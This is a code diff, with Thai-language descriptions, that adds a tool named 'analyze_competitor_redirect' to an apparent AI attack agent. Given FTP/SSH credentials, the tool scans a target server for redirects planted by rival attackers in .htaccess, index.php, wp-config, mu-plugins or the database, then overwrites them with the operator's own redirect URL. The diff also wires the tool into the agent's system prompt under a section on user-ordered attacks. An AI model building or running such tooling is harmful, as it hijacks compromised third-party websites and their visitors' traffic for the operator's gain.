@@ -1231,6 +1231,24 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  // ─── Competitor Redirect Analysis Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "analyze_competitor_redirect",
+      description: "วิเคราะห์ redirect ของคู่แข่งบนเว็บเป้าหมาย — สแกนไฟล์บน server ผ่าน FTP/SSH หาว่าคู่แข่งวาง redirect ไว้ที่ไหน (.htaccess, index.php, wp-config, mu-plugin, DB) และ overwrite ตรงจุด",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนเป้าหมาย เช่น example.com" },
+          username: { type: "string", description: "FTP/SSH username" },
+          password: { type: "string", description: "FTP/SSH password" },
+          redirectUrl: { type: "string", description: "URL ที่ต้องการ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
+        },
+        required: ["domain", "username", "password"],
+      },
+    },
+  },
 ];
 
 // ═══════════════════════════════════════════════════════
@@ -2087,6 +2105,54 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         return `${formatted}\n\n⏱ ${formatDuration(dur)}`;
       }
 
+      case "analyze_competitor_redirect": {
+        const domain = args.domain as string;
+        const username = args.username as string;
+        const password = args.password as string;
+        const redirectUrl = args.redirectUrl as string | undefined;
+
+        const { analyzeCompetitorRedirects, overwriteCompetitorRedirects } = await import("./competitor-redirect-analyzer");
+        const { pickRedirectUrl } = await import("./agentic-attack-engine");
+
+        const targetHost = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+        const creds = {
+          ftp: [{ host: targetHost, username, password, port: 21 }],
+          ssh: [{ host: targetHost, username, password, port: 22 }],
+        };
+
+        const logs: string[] = [];
+        const analysis = await analyzeCompetitorRedirects(targetHost, creds, (msg) => logs.push(msg));
+
+        if (!analysis || analysis.injectionPoints.length === 0) {
+          return `🔬 Competitor Analysis: ${domain}\n\nไม่พบ injection points ของคู่แข่งบน server\n\n📝 Scan log:\n${logs.slice(-5).join("\n")}\n\n⏱ ${formatDuration(Date.now() - startTime)}`;
+        }
+
+        const ourUrl = redirectUrl || await pickRedirectUrl();
+        const overwriteResults = await overwriteCompetitorRedirects(
+          analysis,
+          ourUrl,
+          creds,
+          targetHost,
+          undefined,
+          (msg) => logs.push(msg),
+        );
+
+        const successes = overwriteResults.filter(r => r.success);
+        const pointsSummary = analysis.injectionPoints.map(ip =>
+          `• ${ip.type} @ ${ip.filePath} (${ip.writable ? "✅ writable" : "❌ read-only"})`
+        ).join("\n");
+
+        const overwriteSummary = overwriteResults.map(r =>
+          `${r.success ? "✅" : "❌"} ${r.action}: ${r.detail}`
+        ).join("\n");
+
+        return `🔬 Competitor Analysis: ${domain}\n\n` +
+          `🎯 Competitor URL: ${analysis.competitorUrl || "unknown"}\n` +
+          `📍 Injection Points (${analysis.injectionPoints.length}):\n${pointsSummary}\n\n` +
+          `🛠 Overwrite Results (${successes.length}/${overwriteResults.length} สำเร็จ):\n${overwriteSummary}\n\n` +
+          `⏱ ${formatDuration(Date.now() - startTime)}`;
+      }
+
       default:
         return `Unknown tool: ${name}`;
     }
@@ -2133,6 +2199,7 @@ function buildSystemPrompt(context: SystemContext): string {
 - "สแกนพอร์ต" / "scan port" / "shodan" / "ดูพอร์ต" / "เปิดอะไรบ้าง" + domain → เรียก shodan_scan
 - "ssh" / "sftp" / "อัพผ่าน ssh" / "ssh upload" / "ssh key" + host/user/pass หรือ private key → เรียก ssh_upload (รองรับทั้ง password และ private key auth)
 - "ftp" / "อัพผ่าน ftp" / "ftp upload" + host/user/pass → เรียก ftp_upload
+- "วิเคราะห์ redirect" / "หา redirect คู่แข่ง" / "competitor" / "takeover redirect" / "สแกนไฟล์" / "deep scan" + domain/user/pass → เรียก analyze_competitor_redirect
 - user ส่งไฟล์ .txt ที่มีรายชื่อโดเมน → ระบบจะจัดการอัตโนมัติ (แสดง confirmation keyboard)
 
 ═══ เมื่อ user สั่งโจมตี ═══
